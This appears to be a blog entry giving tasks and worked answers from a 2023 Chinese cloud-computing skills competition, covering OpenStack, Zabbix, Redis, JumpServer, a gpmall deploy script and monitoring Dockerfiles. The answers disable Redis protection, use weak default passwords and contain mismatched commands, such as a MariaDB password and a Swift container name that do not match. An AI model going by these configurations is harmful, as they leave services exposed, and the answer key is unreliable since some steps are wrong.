公司在原有的系统集群监控方案中一直使用的是单节点server的zabbix的监控方案但是在使用过程中经常出现server节点宕机等相关问题，公司给技术部下达了解决该问题的通知。经过公司技术部的技术研讨决定使用zabbix+keealived的解决方案决定使用数据库分离以及双节点server的方式去解决该问题,请根据技术部的技术指标完成下列操作。
任务三： 企业级运维（zabbix）1.完成zabbix 5.0 LTS版本的安装本次zabbix集群决定使用4台主机去实现该功能分别为两台server一台DB服务一台agent服务请按照要求将zabbix搭建完成。
将两台server节点的主页截图黏贴至答题框。【3分】


2.keepalive的高可用配置根据要求完成keepalived的安装与配置要求keepalivedip为10结尾，绑定外网网卡、密码为000000、router_id为100、master节点权重100，backup节点权重80，同时修改相应zabbix监控配置项将所有监控项目引入此ip做到高可用配置。
完成操作后将主页登录界面提交至答题框。【4分】


3.编写状态切换脚本
在keepalived中编写状态切换脚本(check_zabbix_server)，监控zabbix-server是否正常工作，并可在主机出现故障后迅速切换到backup节点提供服务。
请将cat &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf内容提交至答题框。【4分】

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-2023年GZ075 云计算应用赛项赛题</title>
    <url>/posts/cc6b9ff2.html</url>
    <content><![CDATA[模块一 私有云（30分）企业首先完成私有云平台搭建和运维，私有云平台提供云主机、云网络、云存储等基础架构云服务，并开发自动化运维程序。
任务1 私有云服务搭建（5分）1.1.1 基础环境配置1.控制节点主机名为controller，设置计算节点主机名为compute；
#控制节点[root@localhost ~]# hostnamectl set-hostname controller[root@localhost ~]# bash[root@controller ~]##计算节点[root@localhost ~]# hostnamectl set-hostname compute[root@localhost ~]# bash[root@compute ~]#



2.hosts文件将IP地址映射为主机名。
#全部节点[root@controller ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6172.129.1.10 controller172.129.1.11 compute



1.1.2  yum源配置
使用提供的http服务地址，分别设置controller节点和compute节点的yum源文件http.repo。
##因为环境原因 自己上传镜像使用即可,自行挂载使用[root@controller ~]# cat /etc/yum.repos.d/local.repo[centos]name=centosbaseurl=file:///opt/centosgpgcheck=0enabled=1[iaas]name=openstackbaseurl=file:///opt/openstack/iaas-repogpgcheck=0enabled=1[root@compute yum.repos.d]# cat /etc/yum.repos.d/fto.repo[centos]name=centosbaseurl=ftp://controller/centosgpgcheck=0enabled=1[iaas]name=openstackbaseurl=ftp://controller/openstack/iaas-repogpgcheck=0enabled=1



1.1.3 配置无秘钥ssh
配置controller节点可以无秘钥访问compute节点。
[root@controller ~]# ssh-keygenGenerating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Created directory &#x27;/root/.ssh&#x27;.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:SHA256:gyXwgY44hJYX3AgT2fexXMrZm2h5PSO7gjKvLkqaUdQ root@controllerThe key&#x27;s randomart image is:+---[RSA 2048]----+|.+B.=..          ||.=.*.= o .       ||o.ooE * O        ||o.. .  @ .       || ..   . S +      || .     + * +     ||..    o . o o    ||o+ o . . .       ||= oo=.  ...      |+----[SHA256]-----+[root@controller ~]# ssh-copy-id root@compute/usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: &quot;/root/.ssh/id_rsa.pub&quot;The authenticity of host &#x27;compute (172.129.1.11)&#x27; can&#x27;t be established.ECDSA key fingerprint is SHA256:WgjZdcpq8bqsV/iKGbAQHGzRcdjUspMRWZBqg3iXV28.ECDSA key fingerprint is MD5:fc:3a:85:49:87:63:d6:7f:f4:19:b5:cd:ce:f7:f2:88.Are you sure you want to continue connecting (yes/no)? yes/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keysroot@compute&#x27;s password:Number of key(s) added: 1Now try logging into the machine, with:   &quot;ssh &#x27;root@compute&#x27;&quot;and check to make sure that only the key(s) you wanted were added.



1.1.4 基础安装
在控制节点和计算节点上分别安装openstack-iaas软件包。
[root@controller ~]# yum install -y openstack-iaas



1.1.5 数据库安装与调优
在控制节点上使用安装Mariadb、RabbitMQ等服务。并进行相关操作。
[root@controller ~]# iaas-install-mysql.sh

扩展
数据库调优:
在 controller 节点上使用 iaas-install-mysql.sh 脚本安装 Mariadb、Memcached、RabbitMQ等服务。安装服务完毕后，修改&#x2F;etc&#x2F;my.cnf 文件，完成下列要求：
1.设置数据库支持大小写；2.设置数据库缓存 innodb 表的索引，数据，插入数据时的缓冲为 4G； 
3.设置数据库的 log buffer 为 64MB；4.设置数据库的 redo log 大小为 256MB；5.设置数据库的 redo log 文件组为 2。
[root@controller ~]# vim /etc/my.cnf[mysqld]lower_case_table_names =1   #数据库支持大小写innodb_buffer_pool_size = 4G  #数据库缓存innodb_log_buffer_size = 64MB  #设置数据库的log buffer即redo日志缓冲innodb_log_file_size = 256MB   #设置数据库的redo log即redo日志大小innodb_log_files_in_group = 2   #数据库的redo log文件组即redo日志的个数配置





1.1.6  Keystone服务安装与使用
在控制节点上安装Keystone服务并创建用户。
[root@controller ~]# iaas-install-keystone.sh



1.1.7 Glance安装与使用
在控制节点上安装Glance 服务。上传镜像至平台，并设置镜像启动的要求参数。
[root@controller ~]# iaas-install-glance.sh



1.1.8 Nova安装
在控制节点和计算节点上分别安装Nova服务。安装完成后，完成Nova相关配置。
##注意要在安装nova之前安装此脚本[root@controller ~]# iaas-install-placement.sh[root@controller ~]# iaas-install-nova-controller.sh[root@compute ~]# iaas-install-nova-compute.sh

拓展
安装完成后，请修改 nova 相关配置文件，解决因等待时间过长而导致虚拟机启动超时从而获取不
到 IP 地址而报错失败的问题
[root@controller ~]# iaas-install-placement.sh[root@controller ~]# iaas-install-nova-controller.sh[root@controller ~]# vim /etc/nova/nova.conf​#vif_plugging_is_fatal=true​改为​vif_plugging_is_fatal=false​#重启nova-*systemctl restart openstack-nova*



1.1.9 Neutron安装
在控制和计算节点上正确安装Neutron服务。
[root@controller ~]# iaas-install-neutron-controller.sh[root@compute ~]# iaas-install-neutron-compute.sh



1.1.10 Dashboard安装
在控制节点上安装Dashboard服务。安装完成后，将Dashboard中的 Django数据修改为存储在文件中。
[root@controller ~]# iaas-install-dashboard.sh[root@controller ~]# vim /etc/openstack-dashboard/local_settingsSESSION_ENGINE = &#x27;django.contrib.sessions.backends.cache&#x27;改为SESSION_ENGINE = &#x27;django.contrib.sessions.backends.file&#x27;#验证systemctl restart httpd



1.1.11 Swift安装
在控制节点和计算节点上分别安装Swift服务。安装完成后，将cirros镜像进行分片存储。
[root@controller ~]# iaas-install-swift-controller.sh[root@compute ~]# iaas-install-swift-compute.sh

 拓展:
在 控 制 节 点 和 计 算 节 点 上 分 别 使 用 iaas-install-swift-controller.sh 和iaas-install-swift-compute.sh 脚本安装 Swift 服务。安装完成后，使用命令创建一个名叫examcontainer 的容器，将 cirros-0.3.4-x86_64-disk.img 镜像上传到 examcontainer 容器中，并设置分段存放，每一段大小为 10M
[root@controller ~]# lsanaconda-ks.cfg  cirros-0.3.4-x86_64-disk.img  logininfo.txt[root@controller ~]# swift post examcontainers[root@controller ~]# swift upload examcontaiers -S 10485760 cirros-0.3.4-x86_64-disk.imgcirros-0.3.4-x86_64-disk.img segment 1cirros-0.3.4-x86_64-disk.img segment 0cirros-0.3.4-x86_64-disk.img[root@controller ~]# du -sh cirros-0.3.4-x86_64-disk.img13M     cirros-0.3.4-x86_64-disk.img[root@controller ~]##因为镜像就13M，所有存储为两段





1.1.12 Cinder创建硬盘
在控制节点和计算节点分别安装Cinder服务，请在计算节点，对块存储进行扩容操作。
[root@cobtroller ~]# iaas-install-cinder-controller.sh[root@compute ~]# iaas-install-cinder-compute.sh

扩展
请在计算节点，对块存储进行扩容操作， 即在计算节点再分出一个 5G 的分区，加入到 cinder 块存储的后端存储中去
#创建物理卷pvcreate /dev/vdb4#扩展cinder-volume卷组vgextend cinder-volumes /dev/vdb4#验证[root@compute ~]# vgdisplay

1.1.13 Manila服务安装与使用
在控制和计算节点上分别在控制节点和计算节点安装Manila服务。
[root@controller ~]# iaas-install-manila-controller.sh[root@compute ~]# iaas-install-manila-compute.sh



任务2 私有云服务运维（15分)1.2.1 OpenStack开放镜像权限
在admin项目中存在glance-cirros镜像文件，将glance-cirros镜像指定demo项目进行共享使用。
[root@controller ~]# openstack image set glance-cirros --shared



1.2.2	SkyWalking 应用部署
申请一台云主机，使用提供的软件包安装Elasticsearch服务和SkyWalking服务。再申请一台云主机，用于搭建gpmall商城应用，并配置SkyWalking 监控gpmall主机。
#将所需要的包进行上传#elasticsearch部署[root@controller ~]# rpm -ivh elasticsearch-7.0.0-x86_64.rpm[root@controller ~]# vi /etc/elasticsearch/elasticsearch.yml需要配置的地方：cluster.name: yutao – 这个需要和skywalking中的elasticsearch配置保持一致node.name: node-1network.host: 0.0.0.0http.port: 9200 （默认就是，可以不解开注释，我解开了）discovery.seed_hosts: [“127.0.0.1”] 一定要配置，不然找不到主节点cluster.initial_master_nodes: [“node-1”] 一定要配置，不然找不到主节点[root@controller ~]# systemctl enable --now elasticsearch# skywalking部署storage:  selector: elasticsearch7  elasticsearch:    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125;    clusterNodes: $&#123;SW_STORAGE_ES_CLUSTER_NODES:localhost:9200&#125;    protocol: $&#123;SW_STORAGE_ES_HTTP_PROTOCOL:&quot;http&quot;&#125;    trustStorePath: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PATH:&quot;../es_keystore.jks&quot;&#125;    trustStorePass: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PASS:&quot;&quot;&#125;    user: $&#123;SW_ES_USER:&quot;&quot;&#125;    password: $&#123;SW_ES_PASSWORD:&quot;&quot;&#125;    secretsManagementFile: $&#123;SW_ES_SECRETS_MANAGEMENT_FILE:&quot;&quot;&#125; # Secrets management file in the properties format includes the username, password, which are managed by 3rd party tool.    enablePackedDownsampling: $&#123;SW_STORAGE_ENABLE_PACKED_DOWNSAMPLING:true&#125; # Hour and Day metrics will be merged into minute index.    dayStep: $&#123;SW_STORAGE_DAY_STEP:1&#125; # Represent the number of days in the one minute/hour/day index.    indexShardsNumber: $&#123;SW_STORAGE_ES_INDEX_SHARDS_NUMBER:2&#125;    indexReplicasNumber: $&#123;SW_STORAGE_ES_INDEX_REPLICAS_NUMBER:0&#125;    # Those data TTL settings will override the same settings in core module.    recordDataTTL: $&#123;SW_STORAGE_ES_RECORD_DATA_TTL:7&#125; # Unit is day    otherMetricsDataTTL: $&#123;SW_STORAGE_ES_OTHER_METRIC_DATA_TTL:45&#125; # Unit is day    monthMetricsDataTTL: $&#123;SW_STORAGE_ES_MONTH_METRIC_DATA_TTL:18&#125; # Unit is month    # Batch process setting, refer to https://www.elastic.co/guide/en/elasticsearch/client/java-api/5.5/java-docs-bulk-processor.html    bulkActions: $&#123;SW_STORAGE_ES_BULK_ACTIONS:1000&#125; # Execute the bulk every 1000 requests    flushInterval: $&#123;SW_STORAGE_ES_FLUSH_INTERVAL:10&#125; # flush the bulk every 10 seconds whatever the number of requests    concurrentRequests: $&#123;SW_STORAGE_ES_CONCURRENT_REQUESTS:2&#125; # the number of concurrent requests    resultWindowMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_WINDOW_SIZE:10000&#125;    metadataQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_SIZE:5000&#125;    segmentQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_SEGMENT_SIZE:200&#125;    profileTaskQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_PROFILE_TASK_SIZE:200&#125;    advanced: $&#123;SW_STORAGE_ES_ADVANCED:&quot;&quot;&#125;  elasticsearch7:    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125;    clusterNodes: $&#123;SW_STORAGE_ES_CLUSTER_NODES:localhost:9200&#125;    protocol: $&#123;SW_STORAGE_ES_HTTP_PROTOCOL:&quot;http&quot;&#125;    trustStorePath: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PATH:&quot;../es_keystore.jks&quot;&#125;    trustStorePass: $&#123;SW_SW_STORAGE_ES_SSL_JKS_PASS:&quot;&quot;&#125;    enablePackedDownsampling: $&#123;SW_STORAGE_ENABLE_PACKED_DOWNSAMPLING:true&#125; # Hour and Day metrics will be merged into minute index.    dayStep: $&#123;SW_STORAGE_DAY_STEP:1&#125; # Represent the number of days in the one minute/hour/day index.    user: $&#123;SW_ES_USER:&quot;&quot;&#125;    password: $&#123;SW_ES_PASSWORD:&quot;&quot;&#125;    secretsManagementFile: $&#123;SW_ES_SECRETS_MANAGEMENT_FILE:&quot;&quot;&#125; # Secrets management file in the properties format includes the username, password, which are managed by 3rd party tool.    indexShardsNumber: $&#123;SW_STORAGE_ES_INDEX_SHARDS_NUMBER:2&#125;    indexReplicasNumber: $&#123;SW_STORAGE_ES_INDEX_REPLICAS_NUMBER:0&#125;    # Those data TTL settings will override the same settings in core module.    recordDataTTL: $&#123;SW_STORAGE_ES_RECORD_DATA_TTL:7&#125; # Unit is day    otherMetricsDataTTL: $&#123;SW_STORAGE_ES_OTHER_METRIC_DATA_TTL:45&#125; # Unit is day    monthMetricsDataTTL: $&#123;SW_STORAGE_ES_MONTH_METRIC_DATA_TTL:18&#125; # Unit is month    # Batch process setting, refer to https://www.elastic.co/guide/en/elasticsearch/client/java-api/5.5/java-docs-bulk-processor.html    bulkActions: $&#123;SW_STORAGE_ES_BULK_ACTIONS:1000&#125; # Execute the bulk every 1000 requests    flushInterval: $&#123;SW_STORAGE_ES_FLUSH_INTERVAL:10&#125; # flush the bulk every 10 seconds whatever the number of requests    concurrentRequests: $&#123;SW_STORAGE_ES_CONCURRENT_REQUESTS:2&#125; # the number of concurrent requests    resultWindowMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_WINDOW_SIZE:10000&#125;    metadataQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_MAX_SIZE:5000&#125;    segmentQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_SEGMENT_SIZE:200&#125;    profileTaskQueryMaxSize: $&#123;SW_STORAGE_ES_QUERY_PROFILE_TASK_SIZE:200&#125;    advanced: $&#123;SW_STORAGE_ES_ADVANCED:&quot;&quot;&#125;  #h2:  #  driver: $&#123;SW_STORAGE_H2_DRIVER:org.h2.jdbcx.JdbcDataSource&#125;  #  url: $&#123;SW_STORAGE_H2_URL:jdbc:h2:mem:skywalking-oap-db&#125;  #  user: $&#123;SW_STORAGE_H2_USER:sa&#125;  #  metadataQueryMaxSize: $&#123;SW_STORAGE_H2_QUERY_MAX_SIZE:5000&#125;##注意的地方# 因为安装的是elasticsearch7所以这里选的是elasticsearch7storage:  selector: elasticsearch7elasticsearch7:    nameSpace: $&#123;SW_NAMESPACE:&quot;yutao&quot;&#125; # 这和上面elasticsearch配置中的cluster.name保存一直[root@controller ~]# bin/oapService.sh SkyWalking OAP started successfully![root@controller ~]# bin/webappService.shSkyWalking Web Application started successfully!##注意修改端口 二进制文件[root@controller apache-skywalking-apm-bin-es7]# vi webapp/webapp.yml



1.2.3 OpenStack镜像压缩
在HTTP文件服务器中存在一个镜像为CentOS7.5-compress.qcow2的镜像，请对该镜像进行压缩操作。
[root@controller ~]# du -sh CentOS7.5-compress.qcow2892M CentOS7.5-compress.qcow2[root@controller ~]# qemu-img convert -c -O qcow2 CentOS7.5-compress.qcow2 CentOS7.5-compress2.qcow2-c 压缩-O qcow2 输出格式为 qcow2CentOS7.5-compress.qcow2   被压缩的文件CentOS7.5-compress2.qcow2 压缩完成后文件[root@controller ~]# du -sh CentOS7.5-compress2.qcow2405M CentOS7.5-compress2.qcow2



1.2.4 Glance对接Cinder存储
在自行搭建的OpenStack平台中修改相关参数，使Glance可以使用Cinder作为后端存储。
1.2.5 使用Heat模板创建容器
在自行搭建的OpenStack私有云平台上，在&#x2F;root目录下编写Heat模板文件，要求执行yaml文件可以创建名为heat-swift的容器。
[root@controller ~]# cat create_swift.yamlheat_template_version: 2018-08-31resources:  user:    type: OS::Swift::Container    properties:      name: heat-swift#执行yaml文件[root@controller ~]# openstack stack create heat-swift  -t create_swift.yaml



1.2.6 Nova清除缓存
在OpenStack平台上，修改相关配置，让长时间不用的镜像缓存在过一定的时间后会被自动删除。
1.2.7 Redis集群部署。
部署Redis集群，Redis的一主二从三哨兵架构。
#配置redis#本实验通过epel源下载redis##放行相关的安全策略和防火墙[root@localhost ~]# yum install -y redis[root@localhost ~]# vi /etc/redis.conf1.先在网络部分注释掉单机连接那一行,即注释掉bind 127.0.0.1 2.同样我们要将后台运行打开：daemonize no，设置为yes。3.将 保护模式关闭：protected-mode yes 改为：protected-mode no 4.配置密码requirepass的密码改为1234565.配置连接master的密码masterauth 123456#配置连接master(主节点无需)[root@localhost ~]# redis-cli -p 6379&gt; slaveof 127.0.0.1 6379&gt; info replication#主节点查看状态[root@localhost ~]# redis-cli -p 6379&gt; info replication#配置哨兵[root@localhost ~]# vi /etc/redis-sentinel.confprotected-mode nodaemonize yessentinel monitor mymaster 主节点ip 6379 2##启动哨兵[root@localhost ~]# redis-sentinel /etc/redis-sentinel.conf#验证[root@localhost ~]# redis-cli -p 26379127.0.0.1:26379&gt; info sentinel# Sentinelsentinel_masters:1sentinel_tilt:0sentinel_running_scripts:0sentinel_scripts_queue_length:0sentinel_simulate_failure_flags:0master0:name=mymaster,status=sdown,address=172.129.1.50:6379,slaves=2,sentinels=3



1.2.8 Redis AOF调优
修改在Redis相关配置，避免AOF文件过大，Redis会进行AOF重写。
[root@master ~]# vim /etc/redis.confno-appendfsync-on-rewrite noaof-rewrite-incremental-fsync yes#连个参数分别改为aof-rewrite-incremental-fsync nono-appendfsync-on-rewrite yes#配置就是设置为yes时候，在aof重写期间会停止aof的fsync操作[root@master ~]# systemctl restart redis



1.2.9 JumpServer堡垒机部署
使用提供的软件包安装JumpServer堡垒机服务，并配置使用该堡垒机对接自己安装的控制和计算节点。
[root@jumpserver ~]# lsanaconda-ks.cfg  jumpserver.tar.gz  original-ks.cfg
解压软件包jumpserver.tar.gz至&#x2F;opt目录下
[root@jumpserver ~]# tar -zxvf jumpserver.tar.gz -C /opt/[root@jumpserver ~]# ls /opt/compose  config  docker  docker.service  images  jumpserver-repo  static.env
将默认Yum源移至其他目录，创建本地Yum源文件
[root@jumpserver ~]# mv /etc/yum.repos.d/* /mnt/[root@jumpserver ~]# cat &gt;&gt; /etc/yum.repos.d/jumpserver.repo &lt;&lt; EOF[jumpserver]name=jumpserverbaseurl=file:///opt/jumpserver-repogpgcheck=0enabled=1EOF[root@jumpserver ~]# yum repolistrepo id		repo name		statusjumpserver	jumpserver		2

安装Python数据库
[root@jumpserver ~]# yum install python2 -y
安装配置Docker环境
[root@jumpserver opt]# cp -rf /opt/docker/* /usr/bin/[root@jumpserver opt]# chmod 775 /usr/bin/docker*[root@jumpserver opt]# cp -rf /opt/docker.service /etc/systemd/system[root@jumpserver opt]# chmod 775 /etc/systemd/system/docker.service [root@jumpserver opt]# systemctl daemon-reload[root@jumpserver opt]# systemctl enable docker --nowCreated symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /etc/systemd/system/docker.service.
验证服务状态
[root@jumpserver opt]# docker -vDocker version 18.06.3-ce, build d7080c1[root@jumpserver opt]# docker-compose -vdocker-compose version 1.27.4, build 40524192[root@jumpserver opt]# 
安装Jumpserver服务
[root@jumpserver images]# lsjumpserver_core_v2.11.4.tar  jumpserver_lion_v2.11.4.tar  jumpserver_nginx_alpine2.tarjumpserver_koko_v2.11.4.tar  jumpserver_luna_v2.11.4.tar  jumpserver_redis_6-alpine.tarjumpserver_lina_v2.11.4.tar  jumpserver_mysql_5.tar       load.sh[root@jumpserver images]# cat load.sh #!/bin/bashdocker load -i jumpserver_core_v2.11.4.tardocker load -i jumpserver_koko_v2.11.4.tardocker load -i jumpserver_lina_v2.11.4.tardocker load -i jumpserver_lion_v2.11.4.tardocker load -i jumpserver_luna_v2.11.4.tardocker load -i jumpserver_mysql_5.tardocker load -i jumpserver_nginx_alpine2.tardocker load -i jumpserver_redis_6-alpine.tar[root@jumpserver images]# sh load.sh 
创建Jumpserver服务组件目录
[root@jumpserver images]# mkdir -p /opt/jumpserver/&#123;core,koko,lion,mysql,nginx,redis&#125;[root@jumpserver images]# cp -rf /opt/config /opt/jumpserver/
生效环境变量static.env，使用所提供的脚本up.sh启动Jumpserver服务
[root@jumpserver compose]# lsconfig_static                docker-compose-lb.yml              docker-compose-network.yml         down.shdocker-compose-app.yml       docker-compose-mysql-internal.yml  docker-compose-redis-internal.yml  up.shdocker-compose-es.yml        docker-compose-mysql.yml           docker-compose-redis.ymldocker-compose-external.yml  docker-compose-network_ipv6.yml    docker-compose-task.yml[root@jumpserver compose]# source /opt/static.env [root@jumpserver compose]# sh up.sh Creating network &quot;jms_net&quot; with driver &quot;bridge&quot;Creating jms_redis ... doneCreating jms_mysql ... doneCreating jms_core  ... doneCreating jms_lina   ... doneCreating jms_nginx  ... doneCreating jms_celery ... doneCreating jms_lion   ... doneCreating jms_luna   ... doneCreating jms_koko   ... done[root@jumpserver compose]#
浏览器访问http://10.24.193.142，Jumpserver Web登录（admin&#x2F;admin）
图1 Web登录
登录成功后，会提示设置新密码，如图2所示：

图2 修改密码
登录平台后，单击页面右上角下拉菜单切换中文字符设置，如图3所示：

图3 登录成功
至此Jumpserver安装完成。
（6）管理资产
使用管理员admin用户登录Jumpserver管理平台，单击左侧导航栏，展开“资产管理”项目，选择“管理用户”，单击右侧“创建”按钮，如图4所示：

图4 管理用户
创建远程连接用户，用户名为root密码为“Abc@1234”，单击“提交”按钮进行创建，如图5所示：

图5 创建管理用户
选择“系统用户”，单击右侧“创建”按钮，创建系统用户，选择主机协议“SSH”，设置用户名root，密码为服务器SSH密码并单击“提交”按钮，如图6所示：

图6 创建系统用户
单击左侧导航栏，展开“资产管理”项目，选择“资产列表”，单击右侧“创建”按钮，如图7所示：

图7 管理资产
创建资产，将云平台主机（controller）加入资产内，如图8、图9所示：

图8 创建资产controller

图9 创建成功
（7）资产授权
单击左侧导航栏，展开“权限管理”项目，选择“资产授权”，单击右侧“创建”按钮，创建资产授权规则，如图10所示：

图10 创建资产授权规则
（8）测试连接
单击右上角管理员用户下拉菜单，选择“用户界面”，如图11所示：

图11 创建资产授权规则
如果未出现Default项目下的资产主机，单击收藏夹后“刷新”按钮进行刷新，如图12所示：

图12 查看资产
单击左侧导航栏，选择“Web终端”进入远程连接页面，如图13所示：

图13 进入远程连接终端
单击左侧Default，展开文件夹，单击controller主机，右侧成功连接主机，如图14所示：

图14 测试连接
至此OpenStack对接堡垒机案例操作成功。
1.2.10 完成私有云平台的调优或排错工作。（本任务只公布考试范围，不公布赛题）ss
*任务3 私有云运维开发（10分）*1.3.1 编写Shell一键部署脚本
编写一键部署脚本，要求可以一键部署gpmall商城应用系统。
#!/bin/bash#inital hostnamehostnamectl set-hostname mallip=`ip a | sed -nr &quot;s/^ .*inet ([0-9].+)\/24 .*/\1/p&quot;`cat &gt;&gt; /etc/hosts &lt;&lt;EOF127.0.0.1 mysql.mall127.0.0.1 redis.mall127.0.0.1 zk1.mall127.0.0.1 kafka.mall127.0.0.1 zookeeper.mallEOF# config yum ignoremkdir /etc/yum.repos.d/repomv /etc/yum.repos.d/Centos* /etc/yum.repos.d/repocat &gt;&gt; /etc/yum.repos.d/local.repo &lt;&lt;EOF[centos]name=centosbaseurl=file:///opt/centosenabled=1gpgcheck=0[gpmall-repo]name=gpmallbaseurl=file:///root/gpmall_allinone/gpmall-repoenabled=1gpgcheck=0EOFmkdir /opt/centosmount /dev/cdrom /opt/centos#intal enviromentyum install -y java-1.8.0-openjdk*yum install -y redisyum install -y nginxyum install -y mariadb-servertar -zxvf zookeeper-3.4.14.tar.gztar -zxvf kafka_2.11-1.1.1.tgz##started zookeepermv zookeeper-3.4.14/conf/zoo_sample.cfg zookeeper-3.4.14/conf/zoo.cfg./bin/zkServer.sh startecho $?#started kafkakafka_2.11-1.1.1/bin/kafka-server-start.sh -daemon kafka_2.11-1.1.1/config/server.propertiesecho $?#config mairadbmysqladmin -uroot password 123456mysql -uroot -p000000 -e &#x27;create database gpmall;&#x27;mysql -uroot -p000000 -e &#x27;use gpmall;source gpmall/gpmall.sql;&#x27;systemctl enable --now mariadb#config redissed -i &#x27;s/bind 127.0.0.1/#bind 127.0.0.1/&#x27; /etc/redis.confsed -i &#x27;s/protected-mode yes/protected-mode no/&#x27; /etc/redis.confsystemctl enable --now redis#arrange frontrm -rf /usr/share/nginx/html/*cp -rvf gpmall/dist/* /usr/share/nginx/html/rm -rf /etc/nginx/conf.d/default.confcp -rvf gpmall/default.conf /etc/nginx/conf.d/default.confsystemctl restart nginx#jar jarcd gpmallnohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;sleep 2nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;sleep 1nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;sleep 1nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;##可能kafka和zookeeper起不来重启即可



1.3.2  Ansible部署FTP服务
编写Ansible脚本，部署FTP服务。
1.3.3  Ansible部署Kafka服务
编写Playbook，部署的ZooKeeper和Kafka。
1.3.4 编写OpenStack容器云平台自动化运维工具。（本任务只公布考试范围，不公布赛题）
模块二 容器云（30分）企业构建Kubernetes容器云集群，引入KubeVirt实现OpenStack到Kubernetes的全面转型，用Kubernetes来管一切虚拟化运行时，包含裸金属、VM、容器。同时研发团队决定搭建基于Kubernetes 的CI&#x2F;CD环境，基于这个平台来实现DevOps流程。引入服务网格Istio，实现业务系统的灰度发布，治理和优化公司各种微服务，并开发自动化运维程序。
任务1 容器云服务搭建（5分）2.1.1 部署容器云平台
使用OpenStack私有云平台创建两台云主机，分别作为Kubernetes集群的master节点和node节点，然后完成Kubernetes集群的部署，并完成Istio服务网格、KubeVirt虚拟化和Harbor镜像仓库的部署。
任务2 容器云服务运维（15分）2.2.1 容器化部署Node-Exporter
编写Dockerfile文件构建exporter镜像，要求基于centos完成Node-Exporter服务的安装与配置，并设置服务开机自启。
#将安装包上传到指定目录#编写Dockerfile文件[root@k8s-master-node1 node-export]# cat DockerfileFROM centos:7WORKDIR /optCOPY node_exporter-1.3.1.linux-amd64.tar.gz /optRUN tar -zxvf node_exporter-1.3.1.linux-amd64.tar.gz -C /optEXPOSE 9100CMD [&quot;/opt/node_exporter-1.3.1.linux-amd64/node_exporter&quot;]



2.2.2 容器化部署Alertmanager
编写Dockerfile文件构建alert镜像，要求基于centos：latest完成Alertmanager服务的安装与配置，并设置服务开机自启。
#将安装包上传到指定目录#编写Dockerfile文件[root@k8s-master-node1 alertmanager]# cat DockerfileFROM centos:7WORKDIR /optCOPY alertmanager-0.21.0.linux-amd64.tar.gz /optRUN tar -zxvf alertmanager-0.21.0.linux-amd64.tar.gz -C /optEXPOSE 9093CMD [&quot;/opt/alertmanager-0.21.0.linux-amd64/alertmanager&quot;,&quot;--config.file=/opt/alertmanager-0.21.0.linux-amd64/alertmanager.yml&quot;]



2.2.3 容器化部署Grafana
编写Dockerfile文件构建grafana镜像，要求基于centos完成Grafana服务的安装与配置，并设置服务开机自启。
#将安装包上传到指定目录 ,若联网则忽略,本实验联网[root@k8s-master-node1 grafana]# cat DockerfileFROM centos:7WORKDIR /optCOPY grafana-8.1.2-1.x86_64.rpm /optRUN yum install -y fontconfig urw-fonts grafanaCMD [&quot;grafana-server&quot;,&quot;--config /etc/sysconfig/grafana-server&quot;,&quot;--homepath /usr/share/grafana&quot;]



2.2.4 容器化部署Prometheus
编写Dockerfile文件构建prometheus镜像，要求基于centos完成Promethues服务的安装与配置，并设置服务开机自启。
#将安装包上传到指定目录[root@k8s-master-node1 prometheus]# catDockerfile                            prometheus-2.37.0.linux-amd64.tar.gz  prometheus.yml#编写Dockerfile文件Dockerfile  prometheus-2.37.0.linux-amd64.tar.gz  prometheus.yml[root@k8s-master-node1 prometheus]# cat DockerfileFROM centos:7WORKDIR /optCOPY prometheus-2.37.0.linux-amd64.tar.gz /optRUN tar zxvf prometheus-2.37.0.linux-amd64.tar.gz -C /optCOPY prometheus.yml /opt/prometheus-2.37.0.linux-amd64/prometheus.ymlEXPOSE 9090CMD [&quot;/opt/prometheus-2.37.0.linux-amd64/prometheus&quot;]



2.2.5 编排部署监控系统
编写docker-compose.yaml文件，使用镜像exporter、alert、grafana和prometheus完成监控系统的编排部署。
[root@k8s-master-node1 monitor]# cat docker-compose.ymlversion: &quot;3&quot;services:  prometheus:    image: prometheus:v1    ports:      - 9090:9090  node_export:    image: node_exporter:v1    ports:      - 9100:9100    depends_on:      - prometheus  grafana:    image: grafana:v1    ports:      - 3000:3000    depends_on:      - prometheus  alertmanager:    image: 7e39952d313b    ports:      - 9103:9103    depends_on:      - prometheus



2.2.6 安装Jenkins
将Jenkins部署到default命名空间下。要求完成离线插件的安装，设置Jenkins的登录信息和授权策略。
